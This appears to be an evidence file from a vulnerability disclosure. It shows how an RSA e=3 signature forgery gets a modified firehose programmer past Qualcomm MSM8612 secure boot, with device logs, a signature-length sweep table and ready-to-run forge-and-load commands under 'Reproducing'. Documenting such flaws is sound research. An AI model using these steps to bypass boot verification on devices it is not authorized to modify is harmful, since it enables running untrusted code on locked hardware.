# On-device evidence (MSM8612)

Everything here was produced on real hardware over USB, using `emmcdl`. The
device is an MSM8612 in emergency download mode (EDL, USB `05c6:9008`).

## Device facts

```
$ emmcdl -p COM3 -info
SerialNumber     : 0x00da3926
MSM_HW_ID        : 0x008150e1
OEM_PK_HASH      : 0x48692e0d0f309901186e09797cfa591f9d95b7217c656b9e995f1b8bc53da762
SBL SW Version   : 0x00000000
```

Two observations from this alone:

* **`OEM_PK_HASH` is non-zero**, so secure boot is fused on and the PBL really is
  verifying signatures. Forging is not optional on this device.
* `MSM_HW_ID = 0x008150e1` is the high 32 bits of the 8-byte HW_ID
  `0x008150E100150017` used as the outer (`0x5c`) digest key.

## Root of trust: the fused hash is SHA-256 of the root certificate DER

The `OEM_PK_HASH` above matches, byte for byte:

```
SHA256(root certificate DER, complete) =
    48692e0d0f309901186e09797cfa591f9d95b7217c656b9e995f1b8bc53da762
```

Neither the TBS alone nor the modulus alone hashes to this value -- it is the
whole DER, exactly as TalAloni's Note 2 describes. This pins the root of trust
and confirms that the certificate chain in this firmware is the genuine,
fused-anchored one: worth stating, because the whole attack depends on reusing a
real chain rather than forging one.

## The image that was signed

```
$ python mbn_fakesign.py info --mbn firehose_signed.mbn
ImageType             0xd                    (eHostDL / Sahara programmer)
LoadingAddress        0xf800c050
CodeSize              72404 (0x11ad4)
SignatureLength       60 (0x3c)              <-- was 256 in the original
CertStoreLength       6144 (0x1800)
leaf[0] public key    n = 2048 bits, e = 3
root cert SHA-256     48692e0d0f30...da762   (matches the fuse)
```

The leaf is `e = 3`, which is the precondition. Its OU fields read
`04 0015 OEM_ID` and `05 0000A874 SW_SIZE` -- i.e. the chain was issued for a
43 124-byte image, while the payload is 72 404 bytes. That mismatch did **not**
prevent acceptance; see `docs/vulnerability.md` for why the PBL does not check
it.

## Before forgery

The unmodified programmer would not come up:

```
PblHack: Error - 1836597052 (0x9287c0c4)
Did not receive Sahara hello packet
Read operation not allowed
```

Note what this does and does not prove. "Did not receive Sahara hello packet"
means the device was not talking Sahara at all -- the image was never handed to
the PBL, so the PBL never ran, so nothing here says anything about signature
verification. It is a host-side transport failure, not a signature rejection, and
should not be read as evidence either way.

## After forgery

```
$ emmcdl -p COM3 -f firehose_signed.mbn
Downloading
Successfully open
Waiting for flash programmer to boot
logbuf@0xF8020CC0 fh@0xF801DB28
```

The Sahara hello error is gone and the programmer boots: it reports its log
buffer and entry point back to the host. The PBL accepted a 60-byte signature
over a 2048-bit modulus, on a device with signature verification fused on.

Residual, and unrelated to signing: reading the GPT (`-gpt`, LBA 1) still
returns `Read operation not allowed`. That is a limitation of this particular
programmer build, not of the forgery -- the image is running, which is the part
that depends on the signature.

## The L sweep against this firmware

`l_sweep.py firehose_signed.mbn` walks `L` from 38 to 89 and reports, per value,
why it passes or fails:

```
image : firehose_signed.mbn
leaf  : n 2048 bits, e = 3, sha256
code  : 72404 bytes, cert store 6144 bytes
hard cap: e*8L < log2 n  ->  L < 85.33

L    D3[-1]  s^3 bits  s^3<n  0xFFs  PBL
38   c2      -         -      -      skipped: digest even, no cube root mod 2^k
41   1d      984       yes    5      ACCEPTED
42   91      1008      yes    5      ACCEPTED
43   c8      -         -      -      skipped: digest even, no cube root mod 2^k
46   af      1104      yes    9      ACCEPTED
53   ab      1272      yes    17     ACCEPTED
59   c3      1416      yes    21     ACCEPTED
60   13      1437      yes    25     ACCEPTED     <-- the value that booted
...
85   -       2022      yes    -      reject 1158
86   -       2064      no     -      reject 1131
96   -       2304      no     -      reject 1131
256  -       6143      no     -      reject 1131
```

Read this way:

* roughly two thirds of values are skipped purely because the digest is even --
  an artefact of the digest covering the header, which contains `L`;
* `L = 41` and `42` are accepted with only **five** `0xFF` padding bytes, below
  the RFC 8017 floor of eight;
* the ceiling is `s^3 < n`, and it arrives abruptly: `L = 85` fails 1158 (top
  word), `L = 86` and above fail 1131 because the reduction has kicked in and the
  low bytes are scrambled;
* `L = 256`, the standard width, needs 6143 bits of `s^3` against a 2047-bit
  modulus -- over budget by a factor of three, and hopeless by construction.

## Reproducing

```bash
# forge, using the programmer's own (genuine) chain
python mbn_fakesign.py sign \
    --payload-mbn prog_emmc_firehose_8x10.mbn \
    --out firehose_signed.mbn \
    --sw-id 0000000000000003 \
    --hw-id 008150E100150017

# re-verify off disk before touching hardware
python mbn_fakesign.py verify --mbn firehose_signed.mbn \
    --sw-id 0000000000000003 --hw-id 008150E100150017

# load it
emmcdl -p COM3 -f firehose_signed.mbn
```

`verify` is worth running every time: it re-derives the header arithmetic and the
digest from the file alone and prints the PBL verdict both as-is and with
`sig_len == mod_len` enforced, so you can see the one missing check fail.

## A note on the sample image

The firmware directory this image came from is named `eng`, which invites the
conclusion that it is an engineering build with relaxed checks. That conclusion
was checked and **does not hold**: the root CN is `QUALCOMM Attestation CA`, the
standard production attestation chain, and there is no evidence in the image of
any debug relaxation. The judgement was an inference from a directory name and
was withdrawn. The device, not the image, is what decides whether verification
is live -- and `OEM_PK_HASH` says it is.
